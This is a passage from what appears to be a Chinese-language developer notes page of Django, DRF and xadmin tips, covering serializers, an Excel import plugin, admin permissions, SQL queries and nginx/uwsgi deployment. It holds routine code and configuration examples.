10</span><br><span class="line">        </span><br><span class="line">    class StudentSerializers(serializers.ModelSerializer):</span><br><span class="line">        &quot;&quot;&quot;学生表序列化器&quot;&quot;&quot;</span><br><span class="line">        # merchant = MerchantSerializers()</span><br><span class="line">        </span><br><span class="line">        register_time = serializers.DateTimeField(read_only=True, format=&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">       </span><br><span class="line">        class Meta:</span><br><span class="line">            model = Student</span><br><span class="line">            fields = &#x27;__all__&#x27;</span><br><span class="line">    class ClassesSerializers(serializers.ModelSerializer):</span><br><span class="line">        &quot;&quot;&quot;班级表序列化器&quot;&quot;&quot;</span><br><span class="line">        # merchant = MerchantSerializers()</span><br><span class="line">        </span><br><span class="line">        add_time = serializers.DateTimeField(read_only=True, format=&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">       </span><br><span class="line">        class Meta:</span><br><span class="line">            model = Classes</span><br><span class="line">            fields = &#x27;__all__&#x27;</span><br><span class="line">    </span><br><span class="line">    class SchoolSerializers(serializers.ModelSerializer):</span><br><span class="line">        &quot;&quot;&quot;学校表序列化器&quot;&quot;&quot;</span><br><span class="line">        # merchant = MerchantSerializers()</span><br><span class="line">        </span><br><span class="line">        add_time = serializers.DateTimeField(read_only=True, format=&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">       </span><br><span class="line">        class Meta:</span><br><span class="line">            model = School</span><br><span class="line">            fields = &#x27;__all__&#x27;      </span><br><span class="line">            </span><br><span class="line">    </span><br><span class="line">    class StudentInfo(ObjectMultipleModelAPIView):</span><br><span class="line">        # 获取学生信息，班级信息，学校信息</span><br><span class="line">    </span><br><span class="line">        def get(self, request, *args, **kwargs):</span><br><span class="line">            uid = request.GET.get(&#x27;uid&#x27;, &#x27;&#x27;)  # 学生id</span><br><span class="line">            cid = request.GET.get(&#x27;cid&#x27;, &#x27;&#x27;)  # 班级id</span><br><span class="line">            sid = request.GET.get(&#x27;sid&#x27;, &#x27;&#x27;)  # 学校id</span><br><span class="line">            </span><br><span class="line">            self.querylist = [</span><br><span class="line">                &#123;&#x27;queryset&#x27;: Student.objects.filter(id=uid).order_by(&#x27;-id&#x27;),</span><br><span class="line">                    &#x27;serializer_class&#x27;:  StudentSerializers, &#x27;label&#x27;: &#x27;student&#x27;, &#125;,</span><br><span class="line">                &#123;&#x27;queryset&#x27;: Classes.objects.filter(id=cid).order_by(&#x27;-id&#x27;),</span><br><span class="line">                    &#x27;serializer_class&#x27;:  ClassesSerializers, &#x27;label&#x27;: &#x27;classes&#x27;, &#125;,</span><br><span class="line">                &#123;&#x27;queryset&#x27;: School.objects.filter(id=sid).order_by(&#x27;-id&#x27;),</span><br><span class="line">                    &#x27;serializer_class&#x27;:  SchoolSerializers, &#x27;label&#x27;: &#x27;school&#x27;, &#125;,</span><br><span class="line">            ]</span><br><span class="line">    </span><br><span class="line">            return self.list(request, *args, **kwargs)</span><br><span class="line">    </span><br><span class="line">        pagination_class = LimitPagination</span><br></pre></td></tr></table></figure><h2 id="51、-Django序列化器返回外键关联数据"><a href="#51、-Django序列化器返回外键关联数据" class="headerlink" title="51、 Django序列化器返回外键关联数据"></a>51、 Django序列化器返回外键关联数据</h2><p>通过 related_name&#x3D;’goods_price’把两个表关联起来，当返回Goods的信息时也会返回相应的GoodsPrice信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">class GoodsPriceSerializers(serializers.ModelSerializer):</span><br><span class="line">    &quot;&quot;&quot;商品价格表序列化器&quot;&quot;&quot;</span><br><span class="line">    </span><br><span class="line">    class Meta:</span><br><span class="line">        model = GoodsPrice</span><br><span class="line">        fields = [&#x27;price&#x27;]</span><br><span class="line"></span><br><span class="line">class GoodsSerializers(serializers.ModelSerializer):</span><br><span class="line">    &quot;&quot;&quot;商品表序列化器&quot;&quot;&quot;</span><br><span class="line">    </span><br><span class="line">    goods_price = GoodsPriceSerializers(many=True, read_only=True)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        model = Goods</span><br><span class="line">        fields = [&#x27;title&#x27;,&#x27;goods_price&#x27;]</span><br><span class="line">        depth = 2</span><br><span class="line"></span><br><span class="line">class Goods(models.Model):</span><br><span class="line">    &quot;&quot;&quot;商品表&quot;&quot;&quot;</span><br><span class="line">    title = models.CharField(max_length=50, verbose_name=&#x27;商品名称&#x27;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        db_table = &#x27;goods&#x27;</span><br><span class="line">        verbose_name = &#x27;商品信息表&#x27;</span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.title</span><br><span class="line"></span><br><span class="line">class GoodsPrice(models.Model):</span><br><span class="line">    &quot;&quot;&quot;商品价格表,通过外键关联商品信息表&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    price = models.DecimalField(max_digits=10, decimal_places=2, default=0, verbose_name=&#x27;售价&#x27;)</span><br><span class="line">    goods = models.ForeignKey(to=&#x27;Goods&#x27;, related_name=&#x27;goods_price&#x27;, on_delete=models.SET_NULL, blank=True, null=True,verbose_name=&#x27;商品&#x27;)</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return str(self.price)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        managed = True</span><br><span class="line">        db_table = &#x27;goodsPrice&#x27;</span><br><span class="line">        verbose_name = &#x27;商品售价&#x27;</span><br><span class="line">        verbose_name_plural = verbose_name</span><br></pre></td></tr></table></figure><h2 id="52、python-Django通过User-Agent判断请求来源是微信扫一扫或者是支付宝扫一扫"><a href="#52、python-Django通过User-Agent判断请求来源是微信扫一扫或者是支付宝扫一扫" class="headerlink" title="52、python Django通过User Agent判断请求来源是微信扫一扫或者是支付宝扫一扫"></a>52、python Django通过User Agent判断请求来源是微信扫一扫或者是支付宝扫一扫</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Footest(APIView):</span><br><span class="line"> def get(self, request, *args, **kwargs):</span><br><span class="line">     # print(request.META)</span><br><span class="line">     if &#x27;MicroMessenger&#x27; in request.META[&#x27;HTTP_USER_AGENT&#x27;]:</span><br><span class="line">         return Response(data=&#123;&#x27;msg&#x27;: &#x27;访问来源是微信&#x27;&#125;)</span><br><span class="line">     elif &#x27;AlipayClient&#x27; in request.META[&#x27;HTTP_USER_AGENT&#x27;]:</span><br><span class="line">         return Response(data=&#123;&#x27;msg&#x27;: &#x27;访问来源是支付宝&#x27;&#125;)</span><br><span class="line">     else:</span><br><span class="line">         return Response(data=&#123;&#x27;msg&#x27;: &#x27;访问来源是其他&#x27;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p><p>浏览器的 UA 字串</p><p>标准格式为： 浏览器标识 (操作系统标识; 加密等级标识; 浏览器语言) 渲染引擎标识 版本信息</p><p>获取user-Agent 之后，<br>通过识别MicroMessenger或者AlipayClient这样的关键字应该就可以判断是微信还是支付宝<br>【参考文章】 <a href="https://blog.csdn.net/fly910905/article/details/82498813?utm_source=blogxgwz4">https://blog.csdn.net/fly910905/article/details/82498813?utm_source=blogxgwz4</a></p><h2 id="53、xadmin后台集成’导入‘插件，导入excel文件"><a href="#53、xadmin后台集成’导入‘插件，导入excel文件" class="headerlink" title="53、xadmin后台集成’导入‘插件，导入excel文件"></a>53、xadmin后台集成’导入‘插件，导入excel文件</h2><p>效果图：</p><p><img src="https://img-blog.csdnimg.cn/20190426190357134.png" alt="在这里插入图片描述"></p><p>1、添加</p><p>在虚拟环境根目录\Lib\site-packages\xadmin\plugins中添加excel.py文件</p><p><img src="https://img-blog.csdnimg.cn/20190426190440451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>from xadmin.views import BaseAdminPlugin, ListAdminViewfrom django.template import loaderimport xadminclass ListExcelImportPlugin(BaseAdminPlugin):    # 重写init_request    import_excel = False    def init_request(self, *args, **kwargs):        return self.import_excel    def block_top_toolbar(self, context, nodes):        # 这里 xadmin/excel/model_list.top_toolbar.import.html 是自己写的html文件      nodes.append(loader.render_to_string(&quot;xadmin/excel/model_list.top_toolbar.import.html&quot;))xadmin.site.register_plugin(ListExcelImportPlugin, ListAdminView)</code></pre><p>在虚拟环境根目录\Lib\site-packages\xadmin\plugins__init__.py中</p><pre><code>PLUGINS = (...    &#39;excel&#39;,...)</code></pre><p>2、添加html文件</p><p><img src="https://img-blog.csdnimg.cn/20190426190455263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在虚拟环境根目录\Lib\site-packages\xadmin\templates\xadmin\中增加文件夹excel,在文件夹中添加model_list.top_toolbar.import.html文件</p><pre><code>    &#123;% load i18n %&#125;&lt;div class=&quot;btn-group export&quot;&gt;    &lt;a class=&quot;dropdown-toggle btn btn-default btn-sm&quot; data-toggle=&quot;dropdown&quot; href=&quot;#&quot;&gt;        &lt;i class=&quot;icon-share&quot;&gt;&lt;/i&gt; 导入数据 &lt;span class=&quot;caret&quot;&gt;&lt;/span&gt;    &lt;/a&gt;    &lt;ul class=&quot;dropdown-menu&quot; role=&quot;menu&quot; aria-labelledby=&quot;dLabel&quot;&gt;        &lt;li&gt;&lt;a data-toggle=&quot;modal&quot; data-target=&quot;#export-modal-import-excel&quot;&gt;&lt;i class=&quot;icon-circle-arrow-down&quot;&gt;&lt;/i&gt; 导入            Excel&lt;/a&gt;&lt;/li&gt;    &lt;/ul&gt;    &lt;div id=&quot;export-modal-import-excel&quot; class=&quot;modal fade&quot;&gt;        &lt;div class=&quot;modal-dialog&quot;&gt;            &lt;div class=&quot;modal-content&quot;&gt;                &lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&quot;multipart/form-data&quot;&gt;                    &lt;!--&#123;% csrf_token %&#125;--&gt;                    &lt;div class=&quot;modal-header&quot;&gt;                        &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;modal&quot; aria-hidden=&quot;true&quot;&gt;×&lt;/button&gt;                        &lt;h4 class=&quot;modal-title&quot;&gt;导入 Excel&lt;/h4&gt;                    &lt;/div&gt;                    &lt;div class=&quot;modal-body&quot;&gt;                        &lt;input type=&quot;file&quot; onchange=&quot;fileChange(this)&quot; name=&quot;excel&quot; id=&quot;submit_upload&quot;&gt;                    &lt;/div&gt;                    &lt;div class=&quot;modal-footer&quot;&gt;                        &lt;button type=&quot;button&quot; class=&quot;btn btn-default&quot; data-dismiss=&quot;modal&quot;&gt;&#123;% trans "Close" %&#125;&lt;/button&gt;                        &lt;button class=&quot;btn btn-success&quot; type=&quot;button&quot; id=&quot;submit_upload_b&quot;&gt;&lt;i class=&quot;icon-share&quot;&gt;&lt;/i&gt; 导入                        &lt;/button&gt;                    &lt;/div&gt;                &lt;/form&gt;            &lt;/div&gt;&lt;!-- /.modal-content --&gt;        &lt;/div&gt;&lt;!-- /.modal-dalog --&gt;    &lt;/div&gt;&lt;!-- /.modal --&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;    function fileChange(target) &#123;        //检测上传文件的类型        var imgName = document.all.submit_upload.value;        var ext, idx;        if (imgName == &#39;&#39;) &#123;            document.all.submit_upload_b.disabled = true;            alert(&quot;请选择需要上传的 xls 文件!&quot;);            return;        &#125; else &#123;            idx = imgName.lastIndexOf(&quot;.&quot;);            if (idx != -1) &#123;                ext = imgName.substr(idx + 1).toUpperCase();                ext = ext.toLowerCase();                if (ext != &#39;xls&#39; &amp;&amp; ext != &#39;xlsx&#39;) &#123;                    document.all.submit_upload_b.disabled = true;                    alert(&quot;只能上传 .xls 类型的文件!&quot;);                    return;                &#125;            &#125; else &#123;                document.all.submit_upload_b.disabled = true;                alert(&quot;只能上传 .xls 类型的文件!&quot;);                return;            &#125;        &#125;    &#125;    $(document).ready(function () &#123;        $(&#39;#submit_upload_b&#39;).click(function () &#123;            var form_data = new FormData();            var file_info = $(&#39;#submit_upload&#39;)[0].files[0];            form_data.append(&#39;file&#39;, file_info);            form_data.append(&#39;file_source&#39;, $(&#39;.breadcrumb li&#39;).eq(1).text().trim());            var url = window.location.protocol + &#39;//&#39; + window.location.host + &#39;/importkdorderno/&#39;            $.ajax(&#123;                url: url,                type: &#39;POST&#39;,                data: form_data,                dataType: &quot;json&quot;,                beforeSend: function (xhr) &#123;                    xhr.setRequestHeader(&quot;X-CSRFToken&quot;, $.getCookie(&quot;csrftoken&quot;))                &#125;,                processData: false,  // tell jquery not to process the data                contentType: false, // tell jquery not to set contentType                success: function (res) &#123;                    alert(res.msg);                    window.location.reload();                &#125;,                error: function (err) &#123;                &#125;            &#125;);        &#125;);    &#125;)&lt;/script&gt;</code></pre><p>​<br>3、在views.py处理上传的excel文件</p><pre><code>import pandas as pdfrom rest_framework.views import APIViewclass ImportKDOrderNo(APIView):    def post(self, request, *args, **kwargs):        file = request.FILES.get(&#39;file&#39;)        # read = InMemoryUploadedFile().open()        data = pd.read_excel(file)  # 使用pandas处理excel文件        file_source = request.POST.get(&#39;file_source&#39;, &#39;&#39;)  # 文件来源                if &#39;订单号&#39; and &#39;物流单号&#39; not in data:            return Response(data=&#123;&#39;msg&#39;: &#39;文件格式有误，第一行第一列应该为【订单号】，第一行第二列应该为【物流单号】&#39;&#125;)        ordernos = data[&#39;订单号&#39;]        logistics = data[&#39;物流单号&#39;]        for i in range(len(ordernos)):            print(&#39;订单号&#39;, ordernos[i], &#39;物流单号&#39;, logistics[i])                  return Response(data=&#123;&#39;msg&#39;: &#39;上传成功&#39;&#125;)</code></pre><p>4、在urls.py中添加访问路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from django.urls import path</span><br><span class="line">from 你的应用名称 import views</span><br><span class="line"></span><br><span class="line">app_name = &#x27;你的应用名称&#x27;</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    # 其他路由</span><br><span class="line">    ...</span><br><span class="line">    # 导入物流单号</span><br><span class="line">    path(&#x27;importkdorderno/&#x27;, views.ImportKDOrderNo.as_view(), name=&#x27;importkdorderno&#x27;),</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="54、Django中查找今天进账金额"><a href="#54、Django中查找今天进账金额" class="headerlink" title="54、Django中查找今天进账金额"></a>54、Django中查找今天进账金额</h2><p>views.py</p><pre><code>from datetime import datetimeclass CountFee(APIView):    def get(self, request, *args, **kwargs):        # 获取当前时间的年月日，然后使用聚合函数添加fee字段的值        year = datetime.now().year        month = datetime.now().month        day = datetime.now().day        count_fees = FeeDetail.objects.filter(addtime__year=year, addtime__month=month, addtime__day=day).aggregate(Sum(&#39;fee&#39;))        all_fee = count_fees[&#39;fee__sum&#39;] if count_fees[&#39;fee__sum&#39;] else 0        print(all_fee)        return Response(&#123;&#39;code&#39;: 1, &#39;msg&#39;: &#39;success&#39;, &#39;data&#39;: &#123;&#39;all_fee&#39;: all_fee&#125;&#125;)</code></pre><h2 id="55、判断是什么系统"><a href="#55、判断是什么系统" class="headerlink" title="55、判断是什么系统"></a>55、判断是什么系统</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import platform</span><br><span class="line">PlATFORM = platform.system()</span><br><span class="line">if PlATFORM == &quot;Linux&quot;:</span><br><span class="line">    print(&#x27;linux&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;其他&#x27;) </span><br></pre></td></tr></table></figure><h2 id="56、sql查询"><a href="#56、sql查询" class="headerlink" title="56、sql查询"></a>56、sql查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 联合更新</span><br><span class="line">update malluser set master_master_id=3 where master_id in (select a.id from (select id from  malluser where id like &#x27;15%&#x27;)a) </span><br><span class="line"># 统计某字段重复数据</span><br><span class="line">SELECT phone, COUNT(*) AS sumCount FROM malluser GROUP BY phone HAVING sumCount &gt; 1;</span><br></pre></td></tr></table></figure><h2 id="57、-xadmin后台删除数据出现错误"><a href="#57、-xadmin后台删除数据出现错误" class="headerlink" title="57、 xadmin后台删除数据出现错误"></a>57、 xadmin后台删除数据出现错误</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`get_deleted_objects() takes 3 positional arguments but 5 were given`</span><br></pre></td></tr></table></figure><p>这是由于Django2.1版本和xadmin不兼容导致的</p><p>知道虚拟环境\Lib\site-packages\xadmin\plugins\actions.py</p><p>修改93行，</p><p>把</p><pre><code>deletable_objects, model_count, perms_needed, protected = get_deleted_objects(            queryset, self.opts, self.user, self.admin_site, using)</code></pre><p>改为</p><pre><code>deletable_objects, model_count, perms_needed, protected = get_deleted_objects(            queryset, self.user, self.admin_site)</code></pre><p>然后在adminx.py文件中对应的模型类中允许删除</p><pre><code>class MaterialAdmin(object):    &quot;&quot;&quot;素材库分类&quot;&quot;&quot;    list_display = [&#39;id&#39;, &#39;name&#39;, &#39;class_id&#39;, &#39;is_delete&#39;, &#39;addtime&#39;]      def has_delete_permission(self, *args, **kwargs):        return True</code></pre><h2 id="58、xdamin限制用户点击"><a href="#58、xdamin限制用户点击" class="headerlink" title="58、xdamin限制用户点击"></a>58、xdamin限制用户点击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//如果登录z=xadmin后台的账号不是【root】的就不能点击更新操作</span><br><span class="line">    var master_name = $(&#x27;#top-nav&#x27;).find(&#x27;strong&#x27;).text();</span><br><span class="line">        master_name =  master_name.substring(4);</span><br><span class="line">    if(master_name != &#x27;root&#x27;)&#123;</span><br><span class="line">            $(&quot;.grid-item a&quot;).each(function(index, element) &#123;</span><br><span class="line">                $(this).attr(&#x27;href&#x27;,&#x27;#&#x27;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2 id="59、获取公众号关注url"><a href="#59、获取公众号关注url" class="headerlink" title="59、获取公众号关注url"></a>59、获取公众号关注url</h2><p>在微信网页版，打开公众号，点击右上角“…”，在弹框中选择右下角中间的“查看历史记录”，然后在弹框中选择左上角倒数第一个，“用默认浏览器打开”，就可以在打开的浏览器中获取该公众号的关注url，当把这个url发给好友时，好友点开的就是去关注公众号的页面。</p><h2 id="60、xadmin后台用户操作表权限"><a href="#60、xadmin后台用户操作表权限" class="headerlink" title="60、xadmin后台用户操作表权限"></a>60、xadmin后台用户操作表权限</h2><p>虚拟环境根目录\Lib\site-packages\xadmin\views\base.py</p><p>可以找到：</p><p><img src="https://img-blog.csdnimg.cn/20190627140512311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在项目子应用下的adminx.py中使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import xadmin</span><br><span class="line"></span><br><span class="line">from machine.models import Machine</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MachineAdmin(object):</span><br><span class="line">    list_display = [&#x27;code&#x27;,]  # 显示的字段</span><br><span class="line"></span><br><span class="line">    search_fields = [&#x27;code&#x27;]  # 搜索的字段</span><br><span class="line">    list_filter = [&#x27;code&#x27;, &#x27;is_delete&#x27;] # 过滤的字段</span><br><span class="line">    ordering = (&#x27;-id&#x27;,) # 按id降序排序</span><br><span class="line">    list_editable = [&#x27;is_delete&#x27;, ]  # 数据即时编辑</span><br><span class="line">    list_per_page = 30  # 每页显示数据数量</span><br><span class="line">    model_icon = &#x27;fa fa-cog fa-spin&#x27;  # 左侧显示的小图标</span><br><span class="line"></span><br><span class="line">    def has_delete_permission(self, *args, **kwargs): </span><br><span class="line">        # 删除权限</span><br><span class="line">        if self.request.user.is_superuser:  # 管理员才能增加</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    def has_add_permission(self, *args, **kwargs):</span><br><span class="line">        if self.request.user.is_superuser:  # 管理员才能增加</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    def has_change_permission(self, *args, **kwargs):</span><br><span class="line">        if self.request.user.is_superuser: # 管理员才能修改</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    def queryset(self):</span><br><span class="line">        qs = super(MachineAdmin, self).queryset()</span><br><span class="line">        if self.request.user.is_superuser:  # 管理员可以查看所有</span><br><span class="line">            return qs</span><br><span class="line">        else:</span><br><span class="line">            # 登录用户只能看到自己修改的数据</span><br><span class="line">            return qs.filter(master_id=self.request.user.last_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xadmin.site.register(MallMachine, MallMachineAdmin)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="61、使用nginx部署项目"><a href="#61、使用nginx部署项目" class="headerlink" title="61、使用nginx部署项目"></a>61、使用nginx部署项目</h2><p>先在&#x2F;etc&#x2F;nginx&#x2F;sites-available中创建一个配置文件，文件名为test(注意没有后缀):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#设定虚拟主机配置</span><br><span class="line">    server &#123;</span><br><span class="line">        #侦听80端口</span><br><span class="line">        listen 80;</span><br><span class="line">        listen 443 ssl;</span><br><span class="line">        #定义使用 www.nginx.cn访问</span><br><span class="line">#ssl on;</span><br><span class="line">        server_name  xxx.xxx.com;</span><br><span class="line">        #定义服务器的默认网站根目录位置</span><br><span class="line">        root /root/项目名称;</span><br><span class="line">ssl_session_timeout 5m; </span><br><span class="line">        ssl_certificate   /etc/nginx/cert/xxx.pem;</span><br><span class="line">        ssl_certificate_key  /etc/nginx/cert/xxx.key;</span><br><span class="line">        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line">        #设定本虚拟主机的访问日志</span><br><span class="line">        #access_log  logs/nginx.access.log  main;</span><br><span class="line"> </span><br><span class="line">        #默认请求</span><br><span class="line">        location / &#123;</span><br><span class="line">            #倒入了uwsgi的配置</span><br><span class="line">            include uwsgi_params; </span><br><span class="line">    client_max_body_size50m;</span><br><span class="line">            #连接uwsgi的超时时间</span><br><span class="line">           # uwsgi_connect_timeout 30; </span><br><span class="line">     #设定了uwsig服务器位置</span><br><span class="line">     uwsgi_pass 127.0.0.1:8002;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        location /static&#123;</span><br><span class="line">      alias /root/项目名称/static;</span><br><span class="line">        &#125;</span><br><span class="line">location /media &#123;</span><br><span class="line">alias /root/项目名称/media;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中xxx.xxx.com表示域名.如果没有https，就使用#把ssl注释掉就可以了。</p><p>然后把test映射到&#x2F;etc&#x2F;nginx&#x2F;sites-enabled</p><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/nginx/sites-available/test /etc/nginx/sites-enabled/test</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即可<br>注意：<br>uwsgi中配置listen&#x3D;1024时，启动uwsgi时可能会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django + uwsgi + nginx 日志Listen queue size is greater than the system max net.core.somaxconn (128).</span><br></pre></td></tr></table></figure><p>解决方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改系统参数</span><br><span class="line"></span><br><span class="line">/proc/sys/net/ipv4/tcp_max_syn_backlog  原来2048    改为8192</span><br><span class="line">/proc/sys/net/core/somaxconn原来128     改为262144</span><br></pre></td></tr></table></figure><p>重启nginx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><h2 id="62、xadmin后台发送邮件找回密码"><a href="#62、xadmin后台发送邮件找回密码" class="headerlink" title="62、xadmin后台发送邮件找回密码"></a>62、xadmin后台发送邮件找回密码</h2><p><img src="https://img-blog.csdnimg.cn/20190710230444358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>输入你用户绑定的邮箱</p><p><img src="https://img-blog.csdnimg.cn/20190710230454725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>想要发送邮件，需要在settings.py中设置邮件发送器</p><p>settings.py最下面增加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 